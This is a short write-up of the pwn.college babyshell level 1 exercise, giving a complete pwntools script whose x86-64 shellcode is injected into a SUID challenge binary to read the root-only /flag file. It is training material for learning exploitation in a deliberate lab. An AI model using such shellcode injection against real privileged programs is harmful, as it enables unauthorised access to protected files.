---
title: "Notes of pwn.college babyshell levels"
date: "2022-01-16"
author: "uoft-flyfreejay"
description: "short notes for pwn.college dojo's shellcoding exercises"
---

# Intro

So, here we go with the shellcoding modules. 

In these challenges, my goals are to read the contents of the `/flag` file. That file is only readable as a root. We will have to inject shellcodes into the binaries located under each `/challenge` folder to read the `/flag` using the SUID of the challenge binary. Of course, to make things more interesting each challenge will have their own special constraints. Let's get hacking!

## babyshell

### level1

The very first level. Running `ls -al` in the `/challenge` directory reveals that the binary in the folder has SUID bit set. Constructing the shellcode:

```python
import pwn
import time

pwn.context.arch = "amd64"
pwn.context.encoding = "latin"
pwn.context.log_level = "INFO"
pwn.warnings.simplefilter("ignore")

assembly = r'''
.global _start
.intel_syntax noprefix
_start:
    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
    syscall
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    mov rax, 0
    syscall
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
    syscall
    mov rax, 60
    syscall
flag:
    .ascii "/flag\0"
'''

with pwn.process(f"/challenge/{pwn.os.getenv('HOSTNAME')}") as target:
    pwn.info(target.readrepeat(1))

    target.send(pwn.asm(assembly))
    pwn.info(target.readrepeat(1))
```

I wrapped the shellcode in python and used `pwntools` to send it to the binary. This code will be the default template for the future challenges. 

